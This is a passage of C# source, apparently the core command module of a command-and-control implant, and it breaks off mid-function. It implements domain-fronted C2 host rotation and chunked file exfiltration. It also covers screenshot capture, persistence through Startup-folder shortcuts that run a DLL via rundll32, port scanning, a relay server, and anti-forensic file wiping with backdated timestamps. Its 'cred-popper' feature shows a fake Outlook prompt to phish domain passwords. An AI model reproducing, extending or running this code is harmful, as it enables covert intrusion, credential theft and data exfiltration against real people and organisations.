using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.DirectoryServices.AccountManagement;
using System.Net;
using System.IO;
using System.Reflection;
using IWshRuntimeLibrary;
using System.Diagnostics;
using Core.Common;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Core
{
    class Core
    {
        static Meziantou.Framework.Win32.CredentialResult captureCreds = null;

        [CoreDispatch(Description = "Displays the help for core", Usage = "Usage: Help")]
        public static void help()
        {
            Program.PrintHelp();
        }

        [CoreDispatch(Description = "Displays the core help for core", Usage = "Usage: CoreHelp")]
        public static void corehelp()
        {
            Program.PrintHelp();
        }


        [CoreDispatch(Description = "Used for testing arguments and output", Usage = "Usage: Echo \"Param1\" \"Param2\"")]
        public static void echo(string[] args)
        {
            foreach (var arg in args)
            {
                Console.WriteLine($"Arg: {arg}");
            }

            foreach (var arg in Program.arguments)
            {
                Console.WriteLine($"ArgKey: {arg.Key}");
                Console.WriteLine($"ArgValue: {arg.Value}");
            }
        }

        [CoreDispatch(Description = "Used for setting up comms dfupdate rotation", Usage = "Usage: dfupdate \"d36xb1r83janbu.cloudfront.net\",\"d2argm04ypulrn.cloudfront.net\"")]
        public static void dfupdate(string[] args)
        {
            Comms.DFUpdate(args[1]);
        }

        [CoreDispatch(Description = "Used to get comms rotation values", Usage = "Usage: get-dfupdate")]
        public static void getrotation()
        {
            var x = Comms.GetRotate();
            foreach (var y in x)
            {
                Console.WriteLine($"Rotation: {y}");
            }

            var xx = Comms.GetDF();
            foreach (var yy in xx)
            {
                Console.WriteLine($"DomainFront: {yy}");
            }
        }

        //LocalGroupMember(string Computer, string GroupName)

        [CoreDispatch(Description = "Performs an WinNT GroupName Query", Usage = "Usage: localgroupmember server1.blorebank.local administrators")]
        public static void localgroupmember(string[] args)
        {
            try
            {
                if (args.Length > 2)
                {
                    ActiveDirectory.AD.LocalGroupMember(args[1], args[2]);
                }
                else
                {
                    ActiveDirectory.AD.LocalGroupMember(args[1], null);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running localgroupmember: {e}");
            }
        }

        [CoreDispatch(Description = "Performs an LDAP Search Query", Usage = "Usage: Ldap-Searcher \"(&(objectCategory=user)(samaccountname=user))\" \"LDAP://bloredc1.blorebank.local/DC=blorebank,DC=local\"")]
        public static void ldapsearcher(string[] args)
        {
            try
            {
                if (args.Length > 3)
                {
                    ActiveDirectory.AD.ADSearcher(args[1], args[2], args[3]);
                }
                else if (args.Length > 2)
                {
                    ActiveDirectory.AD.ADSearcher(args[1], args[2], null);
                }
                else
                {
                    ActiveDirectory.AD.ADSearcher(args[1], null, null);
                }                
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running ADSearcher: {e}");
            }
        }

        [CoreDispatch(Description = "Used for setting up comms host rotation", Usage = "Usage: rotate \"https://d36xb1r83janbu.cloudfront.net\",\"https://d2argm04ypulrn.cloudfront.net\"")]
        public static void rotate(string[] args)
        {
            Comms.Rotate(args[1]);
        }

        [CoreDispatch(Description = "Performs a screenshot of the open desktop", Usage = "Usage: Get-Screenshot")]
        public static void getscreenshot()
        {
            try
            {
                Host.Screenshot.screenshot();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen capture: {e}");
            }
        }

        [CoreDispatch(Description = "Performs a screenshot of all open windows", Usage = "Usage: Get-ScreenshotAllWindows")]
        public static void getscreenshotallwindows()
        {
            try
            {
                Host.Screenshot.screenshotallwindows();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen capture: {e}");
            }
        }

        [CoreDispatch(Description = "Performs a screenshot of the users desktop every x minutes/seconds indefinitely untill Stop-ScreenshotMulti is run", Usage = "Usage: Get-ScreenshotMulti 2m")]
        public static void getscreenshotmulti(string[] args)
        {
            try
            {
                Host.Screenshot.screenshotInterval = Common.Timer.checktime(args[1]);
                Host.Screenshot.screenshotEnabled = true;
                Host.Screenshot.runmultiscreenshot();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Could not start multi screenshotter: {e}");
            }
        }

        [CoreDispatch(Description = "Terminates the multi screenshot thread", Usage = "Usage: Stop-ScreenshotMulti")]
        public static void stopscreenshotmulti()
        {
            try
            {
                Console.WriteLine($"[-] Stopped multi screenshotter");
                Host.Screenshot.screenshotEnabled = false;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Stopped multi screenshotter: {e}");
            }
        }

        [CoreDispatch(Description = "Used for getting the publically available methods of a loaded module", Usage = "Usage: GetMethods Core.Program Core")]
        public static void getmethods(string[] args)
        {
            try
            {
                var typeAssembly = args[2];
                var qualName = args[1];
                foreach (var Ass in AppDomain.CurrentDomain.GetAssemblies())
                {
                    if (Ass.FullName.ToString().ToLower().StartsWith(typeAssembly.ToLower()))
                    {
                        Console.WriteLine(typeAssembly);
                        var lTyp = Common.Core.LoadAss($"{qualName}, " + Ass.FullName);
                        MethodInfo[] methodInfo = lTyp.GetMethods();
                        Console.WriteLine($"The methods of the {typeAssembly} class are:\n");
                        foreach (MethodInfo temp in methodInfo)
                        {
                            Console.WriteLine(temp.Name);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get methods: {e}");
            }
        }

        [CoreDispatch(Description = "Used for listing the modules loaded in the local AppDomain", Usage = "Usage: List-Modules")]
        public static void listmodules()
        {
            try
            {
                var appd = AppDomain.CurrentDomain.GetAssemblies();
                Console.WriteLine("[+] Modules loaded:\n");
                foreach (var ass in appd)
                {
                    Console.WriteLine(ass.FullName.ToString());
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot list modules: {e}");
            }
        }

        [CoreDispatch(Description = "Used for uploading a file to the target", Usage = "Usage: Upload-File \"SourceBase64\" \"DestinationFilePath\"")]
        public static void uploadfile(string[] args)
        {
            try
            {
                var splitargs = args[1].Split(new string[] { ";" }, StringSplitOptions.RemoveEmptyEntries);
                var fileBytes = Convert.FromBase64String(splitargs[0]);
                System.IO.File.WriteAllBytes(splitargs[1].Replace("\"", ""), fileBytes);
                Console.WriteLine($"Uploaded file to: {splitargs[1]}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot upload file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for downloading a file from the target, if bigger than 50737418 bytes, it will chunk this over multiple requests", Usage = "Usage: Download-File \"SourceFilePath\"")]
        public static void downloadfile(string[] args)
        {
            try
            {
                var fileName = args[1];
                var chunkSize = 50737418;
                long fileSize = new System.IO.FileInfo(fileName).Length;
                var totalChunks = Math.Ceiling((double)fileSize / chunkSize);
                if (totalChunks < 1) { totalChunks = 1; }
                var totalChunkStr = totalChunks.ToString("00000");
                var totalChunkByte = System.Text.Encoding.UTF8.GetBytes(totalChunkStr);
                var Chunk = 1;
                using (Stream input = System.IO.File.OpenRead(fileName))
                {
                    byte[] buffer = new byte[chunkSize];
                    using (MemoryStream ms = new MemoryStream())
                    {
                        while (true)
                        {
                            int read = input.Read(buffer, 0, buffer.Length);
                            if (read <= 0)
                                break;
                            ms.Write(buffer, 0, read);
                            var ChunkStr = Chunk.ToString("00000");
                            var ChunkedByte = System.Text.Encoding.UTF8.GetBytes(ChunkStr);
                            var preNumbers = new byte[10];
                            preNumbers = Common.Core.Combine(ChunkedByte, totalChunkByte);
                            var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "ConfigManager");
                            Comms.Exec("", Common.Core.Combine(preNumbers, ms.ToArray()));
                            Chunk++;
                            ms.SetLength(0);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot download-file: {e}");
            }
        }

        [CoreDispatch(Description = "Used to stop monitoring the power status of the machine", Usage = "Usage: StopPowerStatus")]
        public static void stoppowerstatus()
        {
            Assembly lTyp = null;
            try
            {
                lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "ConfigManager");
            }
            catch (NullReferenceException)
            {

            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in stoppowerstatus: {e}");
            }
            try
            {
                lTyp.GetType("Program").GetField("Lop", BindingFlags.Public | BindingFlags.Static).SetValue(null, false);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in stoppowerstatus: {e}");
            }
            Console.WriteLine("[-] Stopped powerstatus checking");
        }

        [CoreDispatch(Description = "Used for start monitoring the power status of the machine", Usage = "Usage: LoadPowerStatus")]
        public static void loadpowerstatus()
        {
            try
            {
                var asm = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "PwrStatusTracker");
                var t = asm.GetType("PwrStatusTracker.PwrFrm");
                var tpwn = asm.GetType("PwrStatusTracker.PwrNotifier");
                dynamic pwnr = System.Activator.CreateInstance(tpwn);
                var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "ConfigManager");
                var taskIdstr = lTyp.GetType("Program").GetField("taskId").GetValue(null);
                pwnr.taskid = $"{taskIdstr.ToString()}-pwrstatusmsg";
                var m = t.GetMethod("CreatePwrFrmAsync");
                var pfrm = m.Invoke(null, new object[] { pwnr });
            }
            catch (NullReferenceException)
            {

            }
            catch (Exception e)
            {
                Comms.Exec($"[-] Error in loadpowerstatus: {e}");
            }

        }

        [CoreDispatch(Description = "Used to kill a target process", Usage = "Usage: Kill-Process 1357")]
        public static void killprocess(string[] args)
        {
            try
            {
                Process proc = Process.GetProcessById(Int32.Parse(args[1]));
                proc.Kill();
                Console.WriteLine($"[+] Process terminated: {args[1]}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Failed to terminate process: {e}");
            }
        }



        [CoreDispatch(Description = "Used to start a portscan against a target", Usage = "Usage: PortScan \"Host1,Host2\" \"80,443,3389\" \"1\" \"100\"")]
        public static void portscan(string[] args)
        {
            int iDelay = 1;
            int iThreads = 100;
            try
            {
                Int32.TryParse(args[3], out iDelay);
                Int32.TryParse(args[4], out iThreads);
                iDelay = iDelay * 1000;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error parsing int args: {e}");
            }

            var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "PortScanner-Dll");
            var t = lTyp.GetType("PortScanner_Dll.Scanner.TCPConnectScanner");
            
            dynamic pwnr = System.Activator.CreateInstance(t);
            object[] argObj = { args[1], args[2], iDelay, iThreads, false, true, -1, false };
            var m = t.GetMethod("PerformTCPConnectScan");

            PropertyInfo x = t.GetProperty("VisualResults");
            x.SetValue(x, false);

            var pfrm = m.Invoke(null, argObj);
            var pscanResults = t.GetProperty("Results").GetValue(pfrm).ToString();
            Console.WriteLine(pscanResults);
        }

        [CoreDispatch(Description = "Used to start a new daisy server", Usage = "Usage: Invoke-DaisyChain <args>")]
        public static void invokedaisychain(string[] args)
        {
            var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "Daisy");
            lTyp.GetType("DaisyServer").GetField("boolListener", BindingFlags.Public | BindingFlags.Static).SetValue(null, true);
            string[] urls = args[9].Split(',');
            lTyp.GetType("DaisyServer").GetField("httpserver", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[1]);
            lTyp.GetType("DaisyServer").GetField("httpserverport", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[2]);
            lTyp.GetType("DaisyServer").GetField("server", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[3]);
            lTyp.GetType("DaisyServer").GetField("domainfrontheader", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[4]);
            lTyp.GetType("DaisyServer").GetField("proxyurl", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[5]);
            lTyp.GetType("DaisyServer").GetField("proxyuser", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[6]);
            lTyp.GetType("DaisyServer").GetField("proxypassword", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[7]);
            lTyp.GetType("DaisyServer").GetField("useragent", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[8]);            
            lTyp.GetType("DaisyServer").GetField("URLs", BindingFlags.Public | BindingFlags.Static).SetValue(null, urls);
            lTyp.GetType("DaisyServer").GetField("referer", BindingFlags.Public | BindingFlags.Static).SetValue(null, "");
            Console.WriteLine($"[+] Started Daisy Server on background thread: http://{args[1]}:{args[2]}");
            ThreadPool.QueueUserWorkItem((state) =>
            {
                var x = lTyp.GetType("DaisyServer").InvokeMember("StartDaisy", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null);

            });            
        }

        [CoreDispatch(Description = "Used to stop daisy server", Usage = "Usage: Stop-Daisy")]
        public static void stopdaisy()
        {
            var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "Daisy");
            lTyp.GetType("DaisyServer").GetField("boolListener", BindingFlags.Public | BindingFlags.Static).SetValue(null, false);
            Console.WriteLine($"[-] Stopped Daisy Server");
        }

        [CoreDispatch(Description = "Used to start a new process or run a program, e.g ipconfig.exe", Usage = "Usage: Start-Process net.exe -argumentlist users")]
        public static void startprocess(string[] args)
        {
            try
            {
                var p = new Process();
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = p.StartInfo.RedirectStandardError = p.StartInfo.CreateNoWindow = true;
                p.StartInfo.FileName = args[1];
                if (args.Length > 2)
                {
                    p.StartInfo.Arguments = args[2];
                }
                p.Start();
                Console.WriteLine(p.StandardOutput.ReadToEnd());
                Console.WriteLine(p.StandardError.ReadToEnd());
                p.WaitForExit();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot start process: {e}");
            }
        }

        [CoreDispatch(Description = "Used to run a shortcut, e.g test.lnk", Usage = "Usage: Start-Shortcut c:\\users\\public\\test.lnk")]
        public static void startshortcut(string[] args)
        {
            try
            {
                Process.Start(args[1]);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot start shortcut: {e}");
            }
        }

        [CoreDispatch(Description = "Used for creating a lnk file", Usage = "Usage: Create-Lnk C:\\Users\\userName\\appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Cisco.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\wkrp.dll,VoidFunc")]
        public static void createlnk(string[] args)
        {
            try
            {
                if (args.Length < 3)
                {
                    Console.WriteLine("Not enough args");
                    Console.WriteLine("Usage: Create-Lnk C:\\Users\\userName\\appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Cisco.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\wkrp.dll,VoidFunc");
                }
                else if (args.Length == 4)
                {
                    try
                    {
                        string tLoc = args[1].Replace("\"", "");
                        WshShell shell = new WshShell();
                        IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
                        shortcut.Arguments = @"" + args[3].Replace("\"", "");
                        shortcut.TargetPath = @"" + args[2].Replace("\"", "");
                        shortcut.Save();
                        Console.WriteLine("Written shortcut file:");
                        Console.WriteLine($"[+] {tLoc}");
                        Console.WriteLine($"[+] {args[2]} {args[3]}");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Error writing shortcut file: {e}");
                    }
                }
                else if (args.Length == 3)
                {
                    try
                    {
                        string tLoc = args[1].Replace("\"", "");
                        WshShell shell = new WshShell();
                        IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
                        shortcut.Arguments = @"";
                        shortcut.TargetPath = args[2].Replace("\"", "");
                        shortcut.Save();
                        Console.WriteLine("Written shortcut file:");
                        Console.WriteLine($"[+] {tLoc}");
                        Console.WriteLine($"[+] {args[2]}");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Error writing shortcut file2: {e}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot create lnk file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for creating a startup lnk file", Usage = "Usage: Create-StartupLnk OneNote.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\wkrp.dll,VoidFunc")]
        public static void createstartuplnk(string[] args)
        {
            try
            {
                if (args.Length < 3)
                {
                    Console.WriteLine("Not enough args");
                    Console.WriteLine("Usage: Create-StartupLnk OneNote.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\wkrp.dll,VoidFunc");
                }
                else if (args.Length == 4)
                {
                    string userName = Environment.UserName;
                    string tLoc = @"C:\Users\" + userName + @"\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" + args[1];
                    Console.WriteLine("Written shortcut file:");
                    Console.WriteLine($"[+] {tLoc}");
                    Console.WriteLine($"[+] {args[2]} {args[3]}");
                    WshShell shell = new WshShell();
                    IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
                    shortcut.Arguments = @"" + args[3];
                    shortcut.TargetPath = @"" + args[2];
                    shortcut.Save();
                }
                else if (args.Length == 3)
                {
                    string userName = Environment.UserName;
                    string tLoc = @"C:\Users\" + userName + @"\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" + args[1];
                    Console.WriteLine("Written shortcut file:");
                    Console.WriteLine($"[+] {tLoc}");
                    Console.WriteLine($"[+] {args[2]}");
                    WshShell shell = new WshShell();
                    IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
                    shortcut.Arguments = @"";
                    shortcut.TargetPath = @"" + args[2];
                    shortcut.Save();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot create lnk file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for moving a file from one location to another", Usage = "Usage: Move c:\\temp\\old.exe C:\\temp\\new.exe")]
        public static void move(string[] args)
        {
            try
            {
                if (System.IO.File.Exists(@"" + args[2].Replace("\"", "")))
                {
                    System.IO.File.Delete(@"" + args[2].Replace("\"", ""));
                }
                System.IO.File.Move(@"" + args[1].Replace("\"", ""), @"" + args[2].Replace("\"", ""));
                Console.WriteLine($"[+] Moved successfully to {args[2]} ");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot move file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for copying a file from one location to another", Usage = "Usage: Copy c:\\temp\\test.exe c:\\temp\\test2.exe ")]
        public static void copy(string[] args)
        {
            try
            {
                if (System.IO.File.Exists(@"" + args[1].Replace("\"", "")))
                {
                    System.IO.File.Copy(@"" + args[1].Replace("\"", ""), @"" + args[2].Replace("\"", ""));
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot copy file: {e}");
            }

        }

        [CoreDispatch(Description = "Used for printing the implant working directory", Usage = "Usage: Pwd")]
        public static void pwd()
        {
            try
            {
                Console.WriteLine(Directory.GetCurrentDirectory());
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot print working directory: {e}");
            }
        }

        [CoreDispatch(Description = "Used for deleting a file from the file system", Usage = "Usage: Del c:\\temp\\test.exe")]
        public static void del(string[] args)
        {
            try
            {
                Console.WriteLine("[+] Deleting file:\n");
                if (!System.IO.File.Exists(@"" + args[1].Replace("\"", "")))
                {
                    Console.WriteLine($"[-] Could not find file: {args[1]}");
                }
                else
                {
                    System.IO.File.Delete(@"" + args[1].Replace("\"", ""));
                    if (System.IO.File.Exists(@"" + args[1].Replace("\"", "")))
                    {
                        Console.WriteLine($"[-] Could not delete file: {args[1]}");
                    }
                    else
                    {
                        Console.WriteLine($"[+] Deleted file: {args[1]}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot delete file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for checking a specific process on a remote host using WMI", Usage = "Usage: Get-RemoteProcessListing HOSTNAME explorer.exe")]
        public static void getremoteprocesslisting(string[] args)
        {
            var machineNameArg = args[1];
            var processName = args[2];
            var tasks = new List<Task>();

            string[] computerNames = machineNameArg.Split(',');
            List<string> computerList = new List<string>(computerNames);

            computerList.ForEach(x => {
                Task t = Task.Run(() => WMI.Core.wmitasklist(x, processName));
                tasks.Add(t);
            });

            Task.WaitAll(tasks.ToArray());
        }

        [CoreDispatch(Description = "Used for checking a specific process on a remote host using WMI", Usage = "Usage: Get-RemoteProcessListingAll HOSTNAME")]
        public static void getremoteprocesslistingall(string[] args)
        {
            var machineNameArg = args[1];
            var tasks = new List<Task>();

            string[] computerNames = machineNameArg.Split(',');
            List<string> computerList = new List<string>(computerNames);

            computerList.ForEach(x => {
                Task t = Task.Run(() => WMI.Core.wmitasklistall(x));
                tasks.Add(t);
            });

            Task.WaitAll(tasks.ToArray());
        }

        [CoreDispatch(Description = "Used for securely deleting a file from the file system by overwriting the file first", Usage = "Usage: Posh-Delete c:\\temp\\test.exe")]
        public static void poshdelete(string[] args)
        {
            //https://www.codeproject.com/KB/cs/SharpWipe/sharpwipe_src.zip
            try
            {
                Console.WriteLine("[+] Deleting file:\n");
                if (!System.IO.File.Exists(@"" + args[1].Replace("\"", "")))
                {
                    Console.WriteLine($"[-] Could not find file: {args[1]}");
                }
                else
                {
                    var filename = @"" + args[1].Replace("\"", "");
                    try
                    {
                        if (System.IO.File.Exists(filename))
                        {
                            // Set the files attributes to normal in case it's read-only.

                            System.IO.File.SetAttributes(filename, FileAttributes.Normal);

                            // Calculate the total number of sectors in the file.
                            double sectors = Math.Ceiling(new FileInfo(filename).Length / 512.0);

                            // Create a dummy-buffer the size of a sector.

                            byte[] dummyBuffer = new byte[512];

                            // Create a cryptographic Random Number Generator.
                            // This is what I use to create the garbage data.

                            RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();

                            // Open a FileStream to the file.
                            FileStream inputStream = new FileStream(filename, FileMode.Open);
                            for (int currentPass = 0; currentPass < 2; currentPass++)
                            {

                                inputStream.Position = 0;

                                // Loop all sectors
                                for (int sectorsWritten = 0; sectorsWritten < sectors; sectorsWritten++)
                                {
                                    rng.GetBytes(dummyBuffer);

                                    // Write it to the stream
                                    inputStream.Write(dummyBuffer, 0, dummyBuffer.Length);
                                }
                            }

                            // Truncate the file to 0 bytes.
                            // This will hide the original file-length if you try to recover the file.

                            inputStream.SetLength(0);

                            // Close the stream.
                            inputStream.Close();

                            // As an extra precaution I change the dates of the file so the
                            // original dates are hidden if you try to recover the file.

                            DateTime dt = new DateTime(2037, 1, 1, 0, 0, 0);
                            System.IO.File.SetCreationTime(filename, dt);
                            System.IO.File.SetLastAccessTime(filename, dt);
                            System.IO.File.SetLastWriteTime(filename, dt);

                            // Finally, delete the file

                            System.IO.File.Delete(filename);

                        }
                        Console.WriteLine($"[+] Deleted file: {args[1]}");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Posh-Delete Error: {e}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot delete file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for getting the user info from the target machine", Usage = "Usage: Get-UserInfo")]
        public static void getuserinfo()
        {
            try
            {
                Host.Get_UserInfo.Run();
                Console.WriteLine("\n===================================\nAadJoinInformation\n===================================");
                ActiveDirectory.AD.getaadjoininformation();
                Console.WriteLine("\n===================================\nOSInformation\n===================================");
                getosversion();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get-userinfo: {e}");
            }
        }

        [CoreDispatch(Description = "Used to get a list of suspicious processes", Usage = "Usage: Get-DodgyProcesses")]
        public static void getdodgyprocesses()
        {
            try
            {
                Console.WriteLine($"####################");
                Console.WriteLine($"Suspicious Processes");
                Console.WriteLine($"####################");
                PSee.PSeeMainClass.Processes();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot Get-DodgyProcesses: {e}");
            }
        }

        [CoreDispatch(Description = "Used to get the computer info", Usage = "Usage: Get-ComputerInfo")]
        public static void getcomputerinfo()
        {
            try
            {
                PSee.PSeeMainClass.Run();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot Get-ComputerInfo: {e}");
            }

        }

        [CoreDispatch(Description = "Used to get the contents of a file, e.g. cat or type", Usage = "Usage: GC c:\\temp\\log.txt")]
        public static void gc(string[] args)
        {
            try
            {
                byte[] bytesRead = System.IO.File.ReadAllBytes(@"" + args[1].Replace("\"", ""));
                Console.WriteLine(Encoding.UTF8.GetString(bytesRead));
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot Get-Content of {args[1]}: {e}");
            }

        }

        [CoreDispatch(Description = "Used to get the contents of a file, e.g. cat or type", Usage = "Usage: Get-Content c:\\temp\\log.txt")]
        public static void getcontent(string[] args)
        {
            try
            {
                byte[] bytesRead = System.IO.File.ReadAllBytes(@"" + args[1].Replace("\"", ""));
                Console.WriteLine(Encoding.UTF8.GetString(bytesRead));
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot Get-Content of {args[1]}: {e}");
            }

        }

        [CoreDispatch(Description = "Used to turtle the implant for various hours or minutes", Usage = "Usage: Turtle 5h")]
        public static void turtle(string[] args)
        {
            try
            {
                Common.Timer.Turtle(args);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot go into turtle mode: {e}");
            }
        }

        [CoreDispatch(Description = "Used to test active directory credentials", Usage = "Usage: TestADCredential Domain Username Password")]
        public static void testadcredential(string[] args)
        {
            try
            {
                TestADCredential(args[1], args[2], args[3]);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot test ad credentials: {e}");
            }
        }

        [CoreDispatch(Description = "Used to test local credentials", Usage = "Usage: TestLocalCredential Username Password")]
        public static void testlocalcredential(string[] args)
        {
            try
            {
                TestLocalCredentials(args[1], args[2]);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot test local credentials: {e}");
            }
        }

        [CoreDispatch(Description = "Used to perform a pipe listing of the local server", Usage = "Usage: ls-pipes")]
        public static void lspipes()
        {
            try
            {
                var pipes = System.IO.Directory.GetFiles(@"\\.\\pipe\\");
                foreach (var item in pipes)
                {
                    Console.WriteLine(item.ToString());
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get pipe listing: {e}");
            }
        }

        [CoreDispatch(Description = "Used to perform a pipe listing of the local server", Usage = "Usage: ls-remotepipes server1")]
        public static void lsremotepipes(string[] args)
        {
            try
            {
                var pipes = System.IO.Directory.GetFiles($"\\\\{args[0]}\\pipe\\\\");
                foreach (var item in pipes)
                {
                    Console.WriteLine(item.ToString());
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get pipe listing: {e}");
            }
        }

        [CoreDispatch(Description = "Used to perform a directory listing of the given directory", Usage = "Usage: Ls c:\\temp\\")]
        public static void ls(string[] args)
        {
            try
            {
                GetDirListing(args);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get directory listing: {e}");
            }
        }

        [CoreDispatch(Description = "Used to perform a recursive directory listing of the given directory", Usage = "Usage: Ls-Recurse c:\\temp\\")]
        public static void lsrecurse(string[] args)
        {
            try
            {
                GetDirListing(args, true);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get directory listing: {e}");
            }
        }

        [CoreDispatch(Description = "Used to perform a cred-popper so the user enters their credentials, use get-creds to obtain the output", Usage = "Usage: Cred-Popper Outlook \"Please Enter Your Domain Credentials\" [optional username]")]
        public static void credpopper(string[] args)
        {
            try
            {
                var username = "";
                Console.WriteLine($"\n[+] Started CredPopper OS Version: {Environment.OSVersion.Version.Major} \n ");
                Console.WriteLine($"Always better to migrate to the front application before running cred-popper");
                if (args.Length > 2)
                {
                    if (!string.IsNullOrEmpty(args[1])) { CredPopper.CredentialsPrompt.title = args[1]; }
                    if (!string.IsNullOrEmpty(args[2])) { CredPopper.CredentialsPrompt.caption = args[2]; }
                }
                else
                {
                    CredPopper.CredentialsPrompt.title = "Outlook";
                    CredPopper.CredentialsPrompt.caption = "Pleadse Enter Your Domain Credentials";
                }
                if (args.Length > 3)
                {
                    username = args[3];
                }
                else
                {
                    username = Environment.UserDomainName + "\\" + Environment.UserName;
                }

                if (Environment.OSVersion.Version.Major == 10)
                {
                    Console.WriteLine("\n[>] run get-creds to get output");
                    ThreadPool.QueueUserWorkItem((state) =>
                    {
                        try
                        {
                            captureCreds = Meziantou.Framework.Win32.CredentialManager.PromptForCredentials(
                                captionText: CredPopper.CredentialsPrompt.title,
                                messageText: CredPopper.CredentialsPrompt.caption,
                                saveCredential: Meziantou.Framework.Win32.CredentialSaveOption.Selected,
                                userName: username
                            );
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine($"[-] Get-Creds Failure {e}");
                        }
                    });
                }
                else
                {
                    Console.WriteLine("\n[>] run get-creds to get output");

                    try
                    {
                        CredPopper.CredentialsPrompt.usernameField = username;
                        Thread t = new Thread(new ThreadStart(CredPopper.CredentialsPrompt.CredPopper));
                        t.Start();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Get-Creds Failure {e}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot start cred-popper: {e}");
            }
        }

        [CoreDispatch(Description = "This is the help for 'Echo'", Usage = "Usage: Get-Creds")]
        public static void getcreds()
        {
            try
            {
                if (!string.IsNullOrEmpty(captureCreds?.UserName))
                {
                    Console.WriteLine($"[+] Username: {captureCreds?.Domain}\\{captureCreds?.UserName}\n[+] Password: {captureCreds?.Password}");
                }
                else
                {
                    CredPopper.CredentialsPrompt.GetCreds();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot Get-Creds: {e}");
            }
        }

        [CoreDispatch(Description = "Performs a process list on the target system", Usage = "Usage: Get-ProcessList")]
        public static void getprocesslist()
        {
            try
            {
                string strProcList = ProcessHandler.ProcHandler.GetProcesses();
                Console.WriteLine(strProcList);
